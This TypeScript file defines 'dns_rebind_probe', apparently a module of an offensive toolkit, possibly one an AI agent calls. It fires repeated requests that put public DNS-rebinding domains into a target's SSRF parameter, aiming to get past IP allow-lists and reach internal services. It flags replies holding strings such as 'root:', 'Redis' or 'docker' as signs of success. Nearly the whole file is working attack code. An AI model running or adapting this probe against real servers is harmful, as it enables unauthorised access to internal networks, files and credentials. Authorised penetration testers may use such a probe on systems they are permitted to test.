// T50 — dns_rebind_probe
// DNS rebinding SSRF: first resolution returns attacker IP (passes allow-list),
// second resolution returns internal IP (actual fetch hits internal service).

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'dns_rebind_probe',
  description:
    'Probe for DNS rebinding vulnerability in SSRF allow-list implementations. ' +
    'Tests whether the server re-resolves the hostname between the allow-list check and ' +
    'the actual fetch (TOCTOU on DNS). Uses well-known public rebinding services. ' +
    'A successful DNS rebind bypasses IP-based SSRF allow-lists entirely.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',            type: 'string', required: true,  description: 'Target URL (with SSRF parameter)' },
    { name: 'ssrf_parameter', type: 'string', required: true,  description: 'Parameter name controlling fetched URL' },
    { name: 'rebind_domain',  type: 'string', required: false, description: 'Custom rebind domain (optional; uses public service if omitted)' },
    { name: 'method',         type: 'string', required: false, description: 'HTTP method', default: 'GET' },
    { name: 'headers',        type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms',     type: 'number', required: false, description: 'Per-request timeout ms', default: 20000 },
  ],
};

// Public rebinding services that flip A records between requests.
// These resolve to the attacker's IP on first query, then to 127.0.0.1.
const PUBLIC_REBIND_DOMAINS = [
  'make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms',
  '7f000001.1.1.1.xip.io',
];

export const dnsRebindProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const ssrfParam = String(params.ssrf_parameter || '');
    const customDomain = params.rebind_domain ? String(params.rebind_domain) : null;
    const method = String(params.method || 'GET').toUpperCase();
    const timeoutMs = Number(params.timeout_ms || 20000);

    if (!url || !ssrfParam) return { output: 'url and ssrf_parameter required', parsed: { error: 'missing_params' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const rebindDomains = customDomain ? [customDomain] : PUBLIC_REBIND_DOMAINS;
    const results: Array<{ domain: string; attempt: number; status: number; body_excerpt: string; time_ms: number; potentially_rebinded: boolean; error?: string }> = [];

    for (const domain of rebindDomains) {
      // Fire 3 rapid requests — third may hit after rebind
      for (let attempt = 1; attempt <= 3; attempt++) {
        const start = Date.now();
        try {
          const controller = new AbortController();
          const timer = setTimeout(() => controller.abort(), timeoutMs);
          const rebindUrl = `http://${domain}/`;
          let fetchUrl = url;
          let body: string | undefined;
          if (method === 'GET') {
            const u = new URL(url);
            u.searchParams.set(ssrfParam, rebindUrl);
            fetchUrl = u.toString();
          } else {
            body = JSON.stringify({ [ssrfParam]: rebindUrl });
            headers['Content-Type'] = 'application/json';
          }
          const resp = await fetch(fetchUrl, { method, headers, body, signal: controller.signal });
          clearTimeout(timer);
          const text = await resp.text();
          // After rebind, we expect to see internal service responses
          const potentiallyRebinded = attempt >= 2 && (text.includes('root:') || text.includes('Redis') || text.includes('docker') || text.length > 100);
          results.push({ domain, attempt, status: resp.status, body_excerpt: text.substring(0, 120).replace(/\s+/g, ' '), time_ms: Date.now() - start, potentially_rebinded: potentiallyRebinded });
        } catch (err) {
          results.push({ domain, attempt, status: 0, body_excerpt: '', time_ms: Date.now() - start, potentially_rebinded: false, error: String(err) });
        }
        // Small delay between attempts to give DNS TTL time to expire
        await new Promise(r => setTimeout(r, 500));
      }
    }

    const rebinded = results.filter(r => r.potentially_rebinded);
    const lines = [
      `dns_rebind_probe — ${rebindDomains.length} domains × 3 attempts, param="${ssrfParam}"`,
      `Target: ${url.substring(0, 80)}`,
      `Potential rebind hits: ${rebinded.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.potentially_rebinded ? '⚡ REBINDED' : (r.error ? '✗ ERR     ' : `  · #${r.attempt}   `);
      lines.push(`  ${flag}  [${r.domain.substring(0, 40)}] attempt=${r.attempt}  status=${r.status}  ${r.error ? r.error.substring(0, 40) : ''}`);
      if (r.potentially_rebinded) lines.push(`          body: "${r.body_excerpt.substring(0, 100)}"`);
    }
    lines.push('');
    lines.push('NOTE: DNS rebinding requires TTL ≤ 1s and server re-resolving hostname on actual fetch.');
    lines.push('If allow-list check and fetch share the same resolved IP (cached), rebinding fails.');
    lines.push('For confirmed rebinding, set up a custom domain via https://lock.cmpxchg8b.com/rebinder.html');

    return {
      output: lines.join('\n'),
      parsed: { domains_tested: rebindDomains, total: results.length, rebind_hits: rebinded.length, potentially_rebinded: rebinded, results },
    };
  },
};
